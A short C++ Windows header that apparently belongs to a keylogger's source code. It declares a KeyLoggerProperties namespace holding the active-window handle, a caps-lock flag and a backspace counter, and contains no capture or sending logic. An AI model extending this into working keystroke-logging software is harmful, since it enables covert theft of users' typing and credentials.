#pragma once
#include <windows.h>

namespace KeyLoggerProperties {
	HWND hCurrentWindow;
	bool is_capslock = false;
	int iBackspaceCounter = 0;
}